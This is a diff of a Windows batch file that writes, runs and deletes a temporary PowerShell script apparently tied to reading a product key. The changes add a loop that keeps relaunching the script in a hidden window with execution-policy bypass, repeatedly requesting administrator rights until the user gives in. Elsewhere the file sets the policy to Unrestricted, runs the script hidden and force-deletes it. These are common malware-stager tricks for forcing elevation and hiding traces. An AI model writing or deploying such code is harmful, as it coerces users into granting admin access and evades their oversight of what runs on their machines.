@@ -212,16 +212,24 @@ echo $ProductKey = "-" + $ProductKey >> powershell123.ps1
 echo } >> powershell123.ps1
 echo } >> powershell123.ps1
 echo } >> powershell123.ps1
+echo function Request-Admin { >> powershell123.ps1
+echo while(!(CHECK_IF_ADMIN)) { >> powershell123.ps1
+echo try { >> powershell123.ps1
+echo Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs >> powershell123.ps1
+echo exit >> powershell123.ps1
+echo } >> powershell123.ps1
+echo catch {} >> powershell123.ps1
+echo } >> powershell123.ps1
+echo } >> powershell123.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell123.ps1
 echo TASKS >> powershell123.ps1
 echo #pause >> powershell123.ps1
 echo } else { >> powershell123.ps1
 echo Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell123.ps1
-echo $origin = $MyInvocation.MyCommand.Path >> powershell123.ps1
-echo Start-Process powershell.exe -ArgumentList "-noprofile -file $origin" -verb RunAs >> powershell123.ps1
+echo Request-Admin >> powershell123.ps1
 echo } >> powershell123.ps1
 powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force
-powershell.exe -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
+powershell.exe -noprofile -executionpolicy bypass -WindowStyle hidden -file powershell123.ps1
 del powershell123.ps1 /f /q
 timeout 3 > nul
 exit
